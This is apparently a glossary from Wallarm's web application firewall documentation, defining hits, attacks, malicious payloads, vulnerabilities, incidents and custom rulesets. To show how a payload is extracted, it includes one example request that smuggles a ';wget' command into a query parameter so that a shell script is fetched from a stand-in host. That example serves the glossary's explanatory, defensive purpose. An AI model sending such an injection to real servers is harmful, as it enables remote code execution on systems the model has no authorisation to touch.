# Glossary

The glossary covers the core Wallarm entities to provide you with a better understanding of the platform.

## Hit

A hit is a serialized malicious request (original malicious request and metadata added by the filtering node), e.g.:

![Hit example](images/user-guides/events/analyze-attack-raw.png)

[Details on hit parameters](user-guides/events/analyze-attack.md#analyze-requests-in-an-attack)

## Attack

An attack is a single hit or multiple hits grouped by the following characteristics:

* The same attack type, the parameter with the malicious payload, and the address the hits were sent to. Hits may come from the same or different IP addresses and have different values of the malicious payloads within one attack type.

    This hit grouping method is basic and applied to all hits.

* The same source IP address if [grouping of hits by source IP](user-guides/events/analyze-attack.md#grouping-of-hits) is enabled. Other hit parameter values can differ.

    This hit grouping method works for all hits except for the ones of the Brute force, Forced browsing, BOLA (IDOR), Resource overlimit, Data bomb and Virtual patch attack types.

    If hits are grouped by this method, the [**Mark as false positive**](user-guides/events/false-attack.md#mark-an-attack-as-a-false-positive) button and the [active verification](about-wallarm/detecting-vulnerabilities.md#active-threat-verification) option are unavailable for the attack.

The listed hit grouping methods do not exclude each other. If hits have characteristics of both methods, they are all grouped into one attack.

An example of an attack including a single hit:

![Attack with one hit](images/glossary/attack-with-one-hit-example.png)

An example of an attack including many hits:

![Attack with several hits](images/glossary/attack-with-several-hits-example.png)

## Malicious Payload

A part of an original request containing the following elements:

* Attack signs detected in a request. If several attack signs characterizing the same attack type are detected in a request, only the first sign will be recorded to a payload.
* Context of the attack sign. Context is a set of symbols preceding and closing detected attack signs. Since a payload length is limited, the context can be omitted if an attack sign is of full payload length.

For example:

* Request:

    ```bash
    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
    ```
* Malicious payload:

    ```bash
    ;wget+http://s
    ```

    In this payload, `;wget+` is the [RCE](attacks-vulns-list.md#remote-code-execution-rce) attack sign and another part of the payload is the attack sign context.

Since attack signs are not used to detect [behavioral attacks](about-wallarm/protecting-against-attacks.md#behavioral-attacks), requests sent as a part of behavioral attacks have empty payloads.

## Vulnerability
A vulnerability is an error made due to negligence or inadequate information when building or implementing a web application that can lead to an information security risk.

The information security risks are:

* Unauthorized data access; for example, access to read and modify user data.
* Denial of service.
* Data corruption and other.

The Internet traffic can be used to detect the vulnerabilities, which is what Wallarm does, among other functions.

## Security Incident

A security incident is an occurrence of vulnerability exploitation. An incident is an [attack](#attack) targeted at a confirmed vulnerability.

An incident, just like an attack, is an entity external to your system and is a characteristic of the outside Internet, not the system itself. Despite the fact that the attacks targeted at existing vulnerabilities are a minority, they are of the utmost importance in terms of information security. Wallarm automatically detects the attacks targeted at existing vulnerabilities and displays them as a separate object - incident.

## Circular Buffer
A circular buffer is a data structure that uses a single, fixed‑size buffer as if it were connected end‑to‑end.
[See Wikipedia](https://en.wikipedia.org/wiki/Circular_buffer).

## Custom ruleset (the former term is LOM)

A custom ruleset is a set of compiled security rules downloaded by Wallarm nodes from the Wallarm Cloud.

Custom rules enable you to set up individual rules for the traffic processing, e.g.:

* Mask sensitive data before uploading to the Wallarm Cloud
* Create regexp-based attack indicators
* Apply a virtual patch blocking requests that exploit an active vulnerability
* Disable attack detection in certain requests, etc.

A custom ruleset is not empty by default, it contains the rules created for all clients registered in the Cloud, e.g. the filtration mode rule with the value from the [**Settings → General** tab](user-guides/settings/general.md).

[More details on custom rulesets](user-guides/rules/intro.md)

## Invalid Request
A request that was checked by filter node and does not match LOM rules.

## Reverse Proxy
A reverse proxy is a type of proxy server that retrieves resources on behalf of a client from a server and returns the resources to the client as if they originated from the Web server itself.
[See Wikipedia](https://en.wikipedia.org/wiki/Reverse_proxy).

## Certificate Authority
A certificate authority is an entity that issues digital certificates.
[See Wikipedia](https://en.wikipedia.org/wiki/Certificate_authority).
